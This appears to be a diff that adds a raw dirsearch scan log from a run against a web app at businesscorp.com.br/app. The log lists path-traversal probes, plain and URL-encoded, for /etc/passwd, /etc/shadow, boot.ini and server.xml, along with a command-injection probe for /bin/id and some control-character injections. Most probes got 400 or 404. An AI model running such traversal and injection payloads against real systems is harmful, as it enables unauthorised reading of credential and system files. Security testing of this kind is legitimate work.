@@ -1,0 +1,35 @@
+# Dirsearch started Fri Aug 22 12:23:46 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u businesscorp.com.br/app -e php,txt,html,xml,sql -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -f -r
+
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../../../etc/hosts
+400   246B   http://businesscorp.com.br/app/../../boot.ini
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../../../etc/passwd
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../../../etc/shadow
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../etc/passwd^^
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../etc/shadow^^
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.php
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.txt
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow/
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow.txt
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow.html
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow.xml
+400   246B   http://businesscorp.com.br/app/../../../../../../../../conf/server.xml
+400   246B   http://businesscorp.com.br/app/../../../../../../../../bin/id|
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../etc/passwd
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../../../localstart.asp
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../../../boot.ini
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.html
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.sql
+400   246B   http://businesscorp.com.br/app/../../../../../../../../../../etc/shadow
+404   251B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF
+404   251B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF/
+404   252B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF.php
+404   253B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF.txt
+404   253B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF.html
+404   253B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF.xml
+404   253B   http://businesscorp.com.br/app/%01%02%03%04%0a%0d%0aADSF.sql
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.xml
+400   246B   http://businesscorp.com.br/app/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow.php
+200     2KB  http://businesscorp.com.br/app/../
